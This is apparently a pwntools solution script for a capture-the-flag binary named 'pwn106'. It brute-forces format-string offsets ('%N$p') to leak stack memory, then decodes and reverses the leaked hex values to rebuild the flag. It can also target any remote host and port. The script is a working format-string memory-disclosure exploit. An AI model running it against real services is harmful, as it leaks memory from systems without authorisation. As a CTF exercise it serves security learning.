from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn106'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

flag = ''

for i in range(100):
    try:
        p = start()
        
        # Send the format string as the username
        p.sendline('%{}$p'.format(i).encode())
        p.recvuntil(b'Thanks')
        result = p.recv()

        if not b'nil' in result:
        	print(str(i) + ': ' + str(result))
        	try:
	        	decoded_hex = unhex(result.strip().decode()[2:])
	        	rev_hex = decoded_hex[::-1]
	        	print(str(rev_hex))

	        	flag += rev_hex.decode()
	        except BaseException:
	        	pass
        p.close()
        
    except EOFError:
        pass

info(flag)